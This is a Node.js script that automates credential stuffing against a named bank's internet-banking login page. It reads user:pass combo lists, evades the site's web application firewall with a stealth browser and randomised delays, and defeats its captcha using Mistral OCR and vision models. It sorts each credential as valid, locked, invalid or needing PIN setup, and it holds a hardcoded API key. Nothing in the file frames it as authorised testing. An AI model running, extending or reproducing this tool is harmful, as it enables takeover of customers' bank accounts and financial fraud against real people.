#!/usr/bin/env node
/**
 * Mutual Trust Bank (MTB) NEO internet banking — ibank.mutualtrustbank.com/login/login.aspx
 * via local CloakBrowser. ASP.NET WebForms + F5 BIG-IP ASM WAF.
 *
 * Flow:
 *   GET login.aspx (5s settle; WAF sets TS/TSPD cookies)
 *   fill #loginPageView1_ctl00_txtHandle (username), #loginPageView1_ctl00_txtPassword
 *   click #loginPageView1_ctl00_btnSubmitDB  (image submit)
 *   -> F5 WAF captcha page: img[src^=data:] + #ans (name=answer), submit button
 *   -> Mistral OCR (mistral-ocr-latest) reads code -> fill #ans -> submit (replays login POST)
 *   -> retry OCR up to 4x (new image each attempt)
 *
 * Verdicts:
 *   INVALID_USER   "NO User Found"
 *   INVALID_CREDS  wrong-password wording
 *   SUCCESS        nav off login page (dashboard)
 *   ERROR/UNKNOWN  network/other
 *
 * Usage:
 *   node mtb_login.mjs "user:pass" ...
 *   node mtb_login.mjs --batch <file> [--gap 20] [--out /tmp/mtb_results.json]
 *
 * Input lines: `user:pass` or `host/path:user:pass`.
 */
import { chromium } from '/Volumes/Spare/npm/global/lib/node_modules/@playwright/mcp/node_modules/playwright/index.mjs';
import fs from 'node:fs';

const CLOAK = '/Users/m/.cloakbrowser/chromium-145.0.7632.109.2/Chromium.app/Contents/MacOS/Chromium';
const URL = 'https://ibank.mutualtrustbank.com/login/login.aspx';
const MISTRAL = process.env.MISTRAL_API_KEY || 'TLlIUOIuh6tcApbkjKg61iB3nj6LrwEm';
const MAX_OCR_TRIES = 4;

const rand = (a, b) => Math.round(a + Math.random() * (b - a));
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function readCaptchaOnce(page) {
  // returns { imgHash, candidates } — 4 diverse reads on the same image
  const info = await page.evaluate(() => {
    const i = [...document.querySelectorAll('img')].find(x => x.src.startsWith('data:'));
    return i ? { b64: i.src.split(',')[1], hash: i.src.slice(0, 80) } : null;
  }).catch(() => null);
  if (!info) return null;
  const imgUrl = 'data:image/png;base64,' + info.b64;
  const reads = await Promise.allSettled([
    fetch('https://api.mistral.ai/v1/ocr', {
      method: 'POST', headers: { 'Authorization': 'Bearer ' + MISTRAL, 'Content-Type': 'application/json' },
      body: JSON.stringify({ model: 'mistral-ocr-latest', document: { type: 'image_url', image_url: imgUrl } }),
    }).then(r => r.json()).then(j => j.pages?.[0]?.markdown || ''),
    fetch('https://api.mistral.ai/v1/chat/completions', {
      method: 'POST', headers: { 'Authorization': 'Bearer ' + MISTRAL, 'Content-Type': 'application/json' },
      body: JSON.stringify({ model: 'pixtral-12b-2409', messages: [{ role: 'user', content: [{ type: 'text', text: 'What is the verification code in this image? Reply with ONLY the characters.' }, { type: 'image_url', image_url: imgUrl }] }] }),
    }).then(r => r.json()).then(j => j.choices?.[0]?.message?.content || ''),
  ]);
  const cands = new Set();
  for (const r of reads) {
    if (r.status !== 'fulfilled' || typeof r.value !== 'string') continue;
    for (const m of r.value.matchAll(/[a-zA-Z0-9]{4,7}/g)) cands.add(m[0]);
  }
  // as-read first, then uppercase variant (unknown case sensitivity)
  const out = [];
  for (const c of cands) { out.push(c); if (c !== c.toUpperCase()) out.push(c.toUpperCase()); }
  return { imgHash: info.hash, candidates: out };
}

async function solveCaptcha(page) {
  let imgHash = null;
  for (let i = 0; i < 5; i++) {
    const r = await readCaptchaOnce(page);
    if (!r) return 'OCR_FAIL';
    if (imgHash !== r.imgHash) {
      imgHash = r.imgHash; // new image: fresh candidate pool
    }
    for (const code of r.candidates) {
      await page.fill('#ans', code).catch(() => {});
      await page.evaluate(() => {
        const b = [...document.querySelectorAll('button, input[type=button], input[type=submit]')].find(x => /submit/i.test((x.innerText || x.value || '')));
        if (b) b.click();
      }).catch(() => {});
      await sleep(rand(3800, 5000));
      const state = await page.evaluate(() => {
        const i = [...document.querySelectorAll('img')].find(x => x.src.startsWith('data:'));
        return { has: !!document.querySelector('#ans'), hash: i ? i.src.slice(0, 80) : null };
      }).catch(() => ({ has: false, hash: null }));
      if (!state.has) return 'SOLVED';
      if (state.hash !== imgHash) { imgHash = state.hash; break; } // new image, re-read
    }
  }
  return 'OCR_FAIL';
}

async function tryLogin(user, pass) {
  const browser = await chromium.launch({ headless: false, executablePath: CLOAK, args: ['--window-size=1440,900'] });
  try {
    const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 } });
    const page = await ctx.newPage();
    try {
      await page.goto(URL, { waitUntil: 'load', timeout: 60000 }).catch(() => {});
      await page.waitForSelector('#loginPageView1_ctl00_txtHandle', { timeout: 45000 });
      await sleep(rand(1500, 3500));
      await page.fill('#loginPageView1_ctl00_txtHandle', user);
      await sleep(rand(400, 900));
      await page.fill('#loginPageView1_ctl00_txtPassword', pass);
      await sleep(rand(500, 1100));
      await page.click('#loginPageView1_ctl00_btnSubmitDB');
      await sleep(rand(5000, 6500));

      let capResult = 'NONE';
      if (await page.evaluate(() => !!document.querySelector('#ans')).catch(() => false)) {
        capResult = await solveCaptcha(page);
        await sleep(rand(3500, 5000));
      }

      const st = await page.evaluate(() => ({
        url: location.href.slice(0, 100),
        body: document.body.innerText.replace(/\s+/g, ' ').slice(0, 260),
      })).catch(() => ({ url: '', body: '' }));
      return classify(st, capResult);
    } finally {
      await page.close().catch(() => {});
    }
  } finally {
    await browser.close().catch(() => {});
  }
}

function classify(st, capResult) {
  const t = st.body + ' ' + st.url;
  if (capResult === 'OCR_FAIL') return { status: 'ERROR', detail: 'captcha OCR failed after retries' };
  if (/no user found/i.test(t)) return { status: 'INVALID_USER', detail: 'user not found' };
  if (/locked/i.test(t)) return { status: 'LOCKED', detail: 'user account locked' };
  if (/user is not active|not active/i.test(t)) return { status: 'INACTIVE', detail: 'user account not active' };
  if (/invalid (userid|username) or password|invalid password|wrong password|incorrect password|password (is )?wrong/i.test(t)) return { status: 'INVALID_CREDS', detail: t.slice(0, 90) };
  if (/captcha|support id/i.test(t)) return { status: 'CAPTCHA_STUCK', detail: t.slice(0, 90) };
  if (/pinactivation|pin activation|set up.*pin/i.test(st.url + ' ' + t)) return { status: 'PIN_ACTIVATION', detail: 'valid creds; needs PIN setup at ' + st.url.slice(0, 60) };
  if (st.url && !/login\.aspx/.test(st.url)) return { status: 'SUCCESS', detail: 'nav ' + st.url.slice(0, 70) };
  if (/welcome|logout|account|dashboard|home/i.test(t)) return { status: 'SUCCESS', detail: t.slice(0, 90) };
  return { status: 'UNKNOWN', detail: t.slice(0, 110) };
}

/** Accept `user:pass` or `host/path:user:pass`. */
function parsePair(line) {
  line = line.trim();
  if (!line) return null;
  const parts = line.split(':');
  if (parts.length < 2) return null;
  if (/^[a-z0-9.-]+(\:\d+)?(\/.*)?$/.test(parts[0]) && parts[0].includes('.')) {
    if (parts.length < 3) return null;
    return [parts[1], parts.slice(2).join(':')];
  }
  return [parts[0], parts.slice(1).join(':')];
}

// ---- main ----
const args = process.argv.slice(2);
const batchIdx = args.indexOf('--batch');
const raw = batchIdx !== -1 ? args[batchIdx + 1] : args.filter(a => !a.startsWith('--')).join(',');
const lines = (raw && fs.existsSync(raw) ? fs.readFileSync(raw, 'utf8').split('\n') : (raw || '').split(',')).map(parsePair).filter(Boolean);
const seen = new Set();
const pairs = lines.filter(([u]) => (seen.has(u) ? false : (seen.add(u), true)));
if (!pairs.length) { console.log('usage: node mtb_login.mjs "user:pass" | --batch <file>'); process.exit(1); }

const gapIdx = args.indexOf('--gap');
const GAP = gapIdx !== -1 ? Number(args[gapIdx + 1]) || 20 : 20;
const outIdx = args.indexOf('--out');
const OUT = outIdx !== -1 ? args[outIdx + 1] : '/tmp/mtb_results.json';
const results = fs.existsSync(OUT) ? JSON.parse(fs.readFileSync(OUT, 'utf8')) : {};
const SKIP_STATUS = { INVALID_USER: 1, INVALID_CREDS: 1, SUCCESS: 1, CAPTCHA_STUCK: 1, LOCKED: 1, PIN_ACTIVATION: 1, INACTIVE: 1 };

for (const [u, p] of pairs) {
  if (results[u] && SKIP_STATUS[results[u].status]) { console.log(`${u} -> SKIP (already ${results[u].status})`); continue; }
  let res;
  try {
    res = await tryLogin(u, p);
    console.log(`${u} -> ${res.status} (${res.detail})`);
  } catch (e) {
    console.log(`${u} -> ERROR: ${e.message.slice(0, 100)}`);
    res = { status: 'ERROR', detail: e.message.slice(0, 150) };
  }
  results[u] = res;
  fs.writeFileSync(OUT, JSON.stringify(results, null, 1));
  if (pairs.length > 1) { const gap = rand(GAP * 0.5, GAP * 1.5) * 1000; console.log('waiting ' + Math.round(gap / 1000) + 's...'); await sleep(gap); }
}
console.log('results saved to ' + OUT);
